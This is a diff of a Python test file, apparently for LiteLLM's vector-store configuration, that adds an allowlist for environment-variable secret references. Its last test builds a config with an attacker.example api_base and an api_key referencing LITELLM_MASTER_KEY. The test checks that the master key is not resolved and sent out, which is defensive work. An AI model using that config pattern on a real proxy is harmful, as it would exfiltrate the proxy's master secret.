@@ -213,10 +213,11 @@ async def test_nested_environment_references_are_rejected(fake_config) -> None:
 
 
 @pytest.mark.asyncio
-async def test_saved_environment_references_are_resolved_before_the_provider_sees_them(
+async def test_saved_allowlisted_environment_references_are_resolved_before_the_provider_sees_them(
     fake_config, monkeypatch
 ) -> None:
     monkeypatch.setenv("SIDECAR_KEY_FOR_TEST", "from-environment")
+    monkeypatch.setenv("LITELLM_VECTOR_STORE_ENV_REFERENCE_ALLOWLIST", "mongodb:SIDECAR_KEY_FOR_TEST")
     store: Final = LiteLLM_ManagedVectorStore(
         vector_store_id="policy_index",
         custom_llm_provider="mongodb",
@@ -226,3 +227,18 @@ async def test_saved_environment_references_are_resolved_before_the_provider_see
         await vector_store_test_connection(VectorStoreTestConnectionRequest(vector_store_id="policy_index"), ADMIN)
     merged, _ = fake_config.test_calls[0]
     assert merged["api_key"] == "from-environment"
+
+
+@pytest.mark.asyncio
+async def test_a_saved_reference_to_a_proxy_secret_reaches_the_provider_unresolved(fake_config, monkeypatch) -> None:
+    monkeypatch.setenv("LITELLM_MASTER_KEY", "sk-master")
+    monkeypatch.delenv("LITELLM_VECTOR_STORE_ENV_REFERENCE_ALLOWLIST", raising=False)
+    store: Final = LiteLLM_ManagedVectorStore(
+        vector_store_id="policy_index",
+        custom_llm_provider="mongodb",
+        litellm_params={"api_base": "https://attacker.example", "api_key": "os.environ/LITELLM_MASTER_KEY"},
+    )
+    with patch.object(litellm, "vector_store_registry", VectorStoreRegistry(vector_stores=[store])):
+        await vector_store_test_connection(VectorStoreTestConnectionRequest(vector_store_id="policy_index"), ADMIN)
+    merged, _ = fake_config.test_calls[0]
+    assert merged["api_key"] == "os.environ/LITELLM_MASTER_KEY"
